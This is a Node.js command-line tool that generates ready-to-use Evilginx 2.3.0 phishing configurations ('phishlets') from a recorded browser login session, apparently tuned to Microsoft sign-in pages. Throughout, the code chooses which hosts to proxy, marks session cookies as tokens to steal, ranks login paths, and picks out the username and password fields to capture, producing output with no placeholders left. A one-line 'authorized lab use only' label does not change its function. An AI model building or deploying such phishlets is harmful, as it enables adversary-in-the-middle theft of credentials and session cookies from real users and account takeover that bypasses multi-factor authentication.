#!/usr/bin/env node

/**
 * Evilginx 2.3.0 Phishlet Generator
 * Generates operator-ready phishlets with NO {{PLACEHOLDER}} tokens
 * Implements R4g gold-kit rules and A5e requirements
 */

const fs = require('fs');
const yaml = require('js-yaml');

// Public Suffix List simulation (simplified for test domains)
function getRegistrableDomain(hostname) {
  if (!hostname) return null;

  const parts = hostname.toLowerCase().split('.');

  // Reject hex-like labels (≥12 chars)
  for (const part of parts) {
    if (part.length >= 12 && /^[0-9a-f]+$/.test(part)) {
      return null; // Junk CDN label
    }
  }

  // Edge/CDN suffixes - need special handling
  const edgeSuffixes = [
    'azurefd.net', 'azureedge.net', 'cloudfront.net',
    'akamaihd.net', 'edgecdn.test', 'trafficmanager.net'
  ];

  const fullHost = hostname.toLowerCase();
  for (const suffix of edgeSuffixes) {
    if (fullHost.endsWith('.' + suffix) || fullHost === suffix) {
      // Has 4+ labels under edge suffix? Reject
      const beforeSuffix = fullHost.slice(0, -(suffix.length + 1));
      if (beforeSuffix.split('.').length >= 3) {
        return null; // Too nested for edge CDN
      }
    }
  }

  // Standard eTLD+1 extraction (simplified)
  if (parts.length >= 2) {
    return parts.slice(-2).join('.');
  }

  return null;
}

// Extract subdomain (first meaningful label)
function getSubdomain(hostname, registrable) {
  if (!hostname || !registrable) return '';

  const host = hostname.toLowerCase();
  const reg = registrable.toLowerCase();

  if (host === reg) return '';

  // Remove registrable part
  const prefix = host.replace('.' + reg, '');
  if (!prefix || prefix === host) return '';

  // Get first label
  const labels = prefix.split('.');
  return labels[labels.length - 1] || '';
}

// R4g exclusion list
const EXCLUDED_KEYWORDS = [
  'graph.', 'graph', 'admin.', 'admin', 'monitor.', 'monitor',
  'storage.', 'blob.', 'wcpstatic', 'uhf', 'amcdn', 'office.net',
  'sharepointonline', 'cdn.office', 'lifecycle.office',
  'fpt.', 'copilot', 'clarity.ms', 'onecollector', 'metrics'
];

function isExcluded(hostname) {
  const lower = hostname.toLowerCase();

  for (const kw of EXCLUDED_KEYWORDS) {
    if (lower.includes(kw)) return true;
  }

  // Edge/CDN domains
  const edgeSuffixes = [
    'azurefd.net', 'azureedge.net', 'cloudfront.net',
    'akamaihd.net', 'edgecdn.test', 'trafficmanager.net'
  ];

  for (const suffix of edgeSuffixes) {
    if (lower.endsWith('.' + suffix) || lower === suffix) {
      return true;
    }
  }

  return false;
}

// Check if host is auth-relevant
function isAuthRelevant(event, hostname) {
  // Must not be excluded
  if (isExcluded(hostname)) return false;

  // Has set-cookie?
  if (event.set_cookie_names && event.set_cookie_names.length > 0) {
    return true;
  }

  // Has credential/login path?
  const url = event.url.toLowerCase();
  const authPaths = [
    'login', 'password', 'checkpassword', 'post.srf',
    'getcredentialtype', 'auth', 'oauth', 'saml'
  ];

  for (const path of authPaths) {
    if (url.includes(path)) return true;
  }

  // Single login-asset CDN (session: false)
  const authKeywords = ['auth', 'login', 'msauth', 'authcdn'];
  if (authKeywords.some(kw => hostname.toLowerCase().includes(kw))) {
    return true;
  }

  return false;
}

// Rank login paths (highest wins)
function rankLoginPath(path, event) {
  const lower = path.toLowerCase();

  // Exclude silent-signin and OAuth authorize
  const excluded = [
    '/consumers/oauth2/v2.0/authorize',
    '/consumers/savestate',
    '/auth/complete-silent-signin',
    'complete-oauth',
    'silent-signin'
  ];

  for (const ex of excluded) {
    if (lower.includes(ex)) return -1;
  }

  // Rank by priority
  if (event.form_fields) {
    for (const form of event.form_fields) {
      // Has password field?
      const hasPassword = form.fields.some(f => f.type === 'password');
      if (hasPassword && form.form_action) {
        const formPath = new URL(form.form_action).pathname;
        if (formPath === path) return 100; // Highest priority
      }
    }
  }

  // Password POST paths
  if (lower.includes('post.srf') || lower.includes('checkpassword')) {
    return 80;
  }

  // GetCredentialType or login HTML
  if (lower.includes('getcredentialtype') || lower.includes('login')) {
    return 60;
  }

  // Static assets are excluded
  if (lower.match(/\.(js|css|png|jpg|gif|svg|woff|ttf)$/)) {
    return -1;
  }

  return 0;
}

// Extract URL path
function getPath(url) {
  try {
    return new URL(url).pathname;
  } catch (e) {
    return '/';
  }
}

// Extract hostname
function getHostname(url) {
  try {
    return new URL(url).hostname;
  } catch (e) {
    return null;
  }
}

// Find username field name from form_fields
function findUsernameField(formFields) {
  if (!formFields || formFields.length === 0) return null;

  // Priority order for exact names
  const priority = [
    'loginfmt', 'login', 'user', 'username',
    'usernameentry', 'email', 'account'
  ];

  for (const form of formFields) {
    // Only consider forms with password fields
    const hasPassword = form.fields.some(f => f.type === 'password');
    if (!hasPassword) continue;

    for (const pname of priority) {
      const field = form.fields.find(f =>
        f.name.toLowerCase() === pname.toLowerCase()
      );
      if (field) return field.name;
    }

    // Fallback: any field that's not password
    const nonPassword = form.fields.find(f =>
      f.type !== 'password' && f.type !== 'submit' && f.type !== 'button'
    );
    if (nonPassword) return nonPassword.name;
  }

  return null;
}

// Find password field name from form_fields
function findPasswordField(formFields) {
  if (!formFields || formFields.length === 0) return null;

  for (const form of formFields) {
    const passwordField = form.fields.find(f => f.type === 'password');
    if (passwordField) return passwordField.name;
  }

  return null;
}

// Check for secret-looking values
function containsSecret(text) {
  if (!text || typeof text !== 'string') return false;

  // JWT pattern (check for JWT anywhere in text, not just entire string)
  // JWT is 3 base64url parts separated by dots
  if (/[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}/.test(text)) {
    return true;
  }

  // Also check if entire text is a JWT (original check)
  if (/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/.test(text)) {
    return true;
  }

  // Long alphanumeric (but allow UUIDs in specific format)
  if (text.length > 40 && /^[A-Za-z0-9+/=]+$/.test(text)) {
    return true;
  }

  return false;
}

// Generate phishlet from session
function generatePhishlet(session, options = {}) {
  const events = session.events || [];

  if (events.length === 0) {
    throw new Error('No events in session');
  }

  // Check for secrets in free-text fields
  for (const event of events) {
    if (event.url && containsSecret(event.url)) {
      // Exception: canonical UUIDs are OK
      if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(event.url)) {
        throw new Error('Session contains secret-looking values');
      }
    }
  }

  // Collect auth-relevant hosts
  const hostMap = new Map(); // registrable domain -> representative event

  for (const event of events) {
    const hostname = getHostname(event.url);
    if (!hostname) continue;

    if (!isAuthRelevant(event, hostname)) continue;

    const registrable = getRegistrableDomain(hostname);
    if (!registrable) continue;

    // Override with --include-host if needed
    const forceInclude = options.includeHosts && options.includeHosts.includes(hostname);

    if (isExcluded(hostname) && !forceInclude) continue;

    // Pick representative (prefer login/account over others)
    const existing = hostMap.get(registrable);
    const sub = getSubdomain(hostname, registrable);

    const isPreferred = sub.includes('login') || sub.includes('account');
    const existingSub = existing ? getSubdomain(getHostname(existing.url), registrable) : '';
    const existingPreferred = existingSub.includes('login') || existingSub.includes('account');

    if (!existing || (isPreferred && !existingPreferred)) {
      hostMap.set(registrable, { ...event, hostname });
    }
  }

  if (hostMap.size === 0) {
    throw new Error('No auth-relevant hosts found after exclusions');
  }

  // Build proxy_hosts
  const proxyHosts = [];
  let landingDomain = null;

  for (const [domain, event] of hostMap.entries()) {
    const hostname = event.hostname;
    const origSub = getSubdomain(hostname, domain);

    const hasSession = event.set_cookie_names && event.set_cookie_names.length > 0;

    const entry = {
      phish_sub: origSub,
      orig_sub: origSub,
      domain: domain,
      session: hasSession,
      is_landing: false,
      auto_filter: true
    };

    proxyHosts.push(entry);

    // Pick landing (prefer first with session)
    if (!landingDomain && hasSession) {
      landingDomain = domain;
    }
  }

  // Ensure exactly one landing
  if (!landingDomain && proxyHosts.length > 0) {
    landingDomain = proxyHosts[0].domain;
  }

  for (const host of proxyHosts) {
    if (host.domain === landingDomain) {
      host.is_landing = true;
      break;
    }
  }

  // Build auth_tokens
  const authTokens = [];
  const tokensByDomain = new Map();

  for (const event of events) {
    const hostname = getHostname(event.url);
    if (!hostname) continue;

    const registrable = getRegistrableDomain(hostname);
    if (!registrable || isExcluded(hostname)) continue;

    // Only from hosts in proxy_hosts
    if (!hostMap.has(registrable)) continue;

    if (event.set_cookie_names && event.set_cookie_names.length > 0) {
      if (!tokensByDomain.has(registrable)) {
        tokensByDomain.set(registrable, new Set());
      }

      for (const cookieName of event.set_cookie_names) {
        tokensByDomain.get(registrable).add(cookieName);
      }
    }
  }

  for (const [domain, cookies] of tokensByDomain.entries()) {
    authTokens.push({
      domain: domain,
      keys: Array.from(cookies)
    });
  }

  // Build auth_urls (retain checkpassword, GetCredentialType, etc.)
  const authUrls = [];
  const authKeywords = ['checkpassword', 'getcredentialtype', 'oauth', 'saml', 'authorize'];

  for (const event of events) {
    const path = getPath(event.url);
    const lower = path.toLowerCase();

    for (const kw of authKeywords) {
      if (lower.includes(kw) && !authUrls.includes(path)) {
        authUrls.push(path);
        break;
      }
    }
  }

  // Determine login.path
  let loginPath = null;
  let loginDomain = null;
  let bestRank = -1;

  for (const event of events) {
    const hostname = getHostname(event.url);
    if (!hostname) continue;

    const registrable = getRegistrableDomain(hostname);
    if (!registrable || !hostMap.has(registrable)) continue;

    const path = getPath(event.url);
    const rank = rankLoginPath(path, event);

    if (rank > bestRank) {
      bestRank = rank;
      loginPath = path;
      loginDomain = registrable;
    }
  }

  // Fallback if no ranked path found
  if (!loginPath && proxyHosts.length > 0) {
    loginDomain = landingDomain;
    loginPath = '/';
  }

  // Determine credentials from form_fields
  let usernameKey = null;
  let passwordKey = null;

  // Collect all form_fields
  const allFormFields = [];
  for (const event of events) {
    if (event.form_fields) {
      allFormFields.push(...event.form_fields);
    }
  }

  if (allFormFields.length > 0) {
    usernameKey = findUsernameField(allFormFields);
    passwordKey = findPasswordField(allFormFields);
  }

  // Heuristic fallback
  if (!usernameKey) usernameKey = 'login';
  if (!passwordKey) passwordKey = 'passwd';

  const credentials = {
    username: {
      key: usernameKey,
      search: '(.*)',
      type: 'post'
    },
    password: {
      key: passwordKey,
      search: '(.*)',
      type: 'post'
    }
  };

  // Build sub_filters from proxy_hosts
  const subFilters = [];

  for (const host of proxyHosts) {
    const triggersOn = host.orig_sub
      ? `${host.orig_sub}.${host.domain}`
      : host.domain;

    subFilters.push({
      triggers_on: triggersOn,
      orig_sub: host.orig_sub,
      domain: host.domain,
      search: 'https://{hostname}/',
      replace: 'https://{hostname}/',
      mimes: ['text/html', 'application/json', 'application/javascript']
    });
  }

  // Ensure at least one filter
  if (subFilters.length === 0) {
    throw new Error('No sub_filters generated');
  }

  const phishlet = {
    author: options.author || 'lab-operator',
    min_ver: '2.3.0',
    proxy_hosts: proxyHosts,
    auth_tokens: authTokens,
    auth_urls: authUrls,
    login: {
      domain: loginDomain,
      path: loginPath
    },
    credentials: credentials,
    sub_filters: subFilters
  };

  return phishlet;
}

// Validate phishlet
function validatePhishlet(phishlet, schemaPath) {
  const schema = JSON.parse(fs.readFileSync(schemaPath, 'utf8'));
  const Ajv = require('ajv');
  const ajv = new Ajv();

  const validate = ajv.compile(schema);
  const valid = validate(phishlet);

  if (!valid) {
    throw new Error(`Schema validation failed: ${JSON.stringify(validate.errors, null, 2)}`);
  }

  // Additional checks
  const yamlText = yaml.dump(phishlet);

  if (yamlText.includes('{{PLACEHOLDER}}')) {
    throw new Error('YAML contains {{PLACEHOLDER}} tokens');
  }

  return true;
}

// CLI
function main() {
  const args = process.argv.slice(2);

  if (args.length === 0) {
    console.error('Usage: phishlet-generator.js <session.json> [options]');
    console.error('Options:');
    console.error('  --output <file>        Output YAML file');
    console.error('  --schema <file>        Schema file for validation');
    console.error('  --author <name>        Author name');
    console.error('  --include-host <host>  Force include host');
    process.exit(1);
  }

  const sessionFile = args[0];
  const options = {
    outputFile: null,
    schemaFile: null,
    author: 'lab-operator',
    includeHosts: []
  };

  for (let i = 1; i < args.length; i++) {
    if (args[i] === '--output' && i + 1 < args.length) {
      options.outputFile = args[++i];
    } else if (args[i] === '--schema' && i + 1 < args.length) {
      options.schemaFile = args[++i];
    } else if (args[i] === '--author' && i + 1 < args.length) {
      options.author = args[++i];
    } else if (args[i] === '--include-host' && i + 1 < args.length) {
      options.includeHosts.push(args[++i]);
    }
  }

  try {
    const session = JSON.parse(fs.readFileSync(sessionFile, 'utf8'));
    const phishlet = generatePhishlet(session, options);

    // Validate if schema provided
    if (options.schemaFile) {
      validatePhishlet(phishlet, options.schemaFile);
      console.log('✓ Schema validation passed');
    }

    const yamlText = `# Evilginx 2.3.0 phishlet - authorized lab use only\n` +
                     yaml.dump(phishlet);

    if (options.outputFile) {
      fs.writeFileSync(options.outputFile, yamlText, 'utf8');
      console.log(`✓ Phishlet written to ${options.outputFile}`);
    } else {
      console.log(yamlText);
    }

  } catch (error) {
    console.error(`Error: ${error.message}`);
    process.exit(1);
  }
}

// Export for testing
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    generatePhishlet,
    validatePhishlet,
    getRegistrableDomain,
    getSubdomain,
    isExcluded,
    isAuthRelevant,
    rankLoginPath,
    findUsernameField,
    findPasswordField,
    containsSecret
  };
}

// Run CLI if invoked directly
if (require.main === module) {
  main();
}
